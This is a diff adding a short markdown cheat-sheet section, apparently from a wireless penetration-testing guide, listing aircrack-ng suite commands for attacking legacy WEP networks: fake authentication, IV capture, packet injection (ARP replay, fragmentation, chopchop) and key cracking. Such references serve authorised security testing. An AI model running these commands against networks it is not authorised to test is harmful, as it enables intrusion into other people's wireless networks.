@@ -1,0 +1,12 @@
+**WEP Testing (Legacy)**:
+- **Authentication Bypass**:
+  - Open System vs Shared Key
+  - `aireplay-ng -1 0 -a <BSSID> -h <MAC> wlan0mon`
+- **IV Collection**:
+  - `airodump-ng -c <CH> --bssid <BSSID> -w wep wlan0mon`
+  - `aireplay-ng -3 -b <BSSID> -h <MAC> wlan0mon` (ARP replay)
+  - `aireplay-ng -5 -b <BSSID> -h <MAC> wlan0mon` (fragmentation)
+  - `aireplay-ng -4 -b <BSSID> -h <MAC> wlan0mon` (chopchop)
+- **Cracking**:
+  - `aircrack-ng wep-01.cap` (PTW attack)
+  - `aircrack-ng -K wep-01.cap` (KoreK)
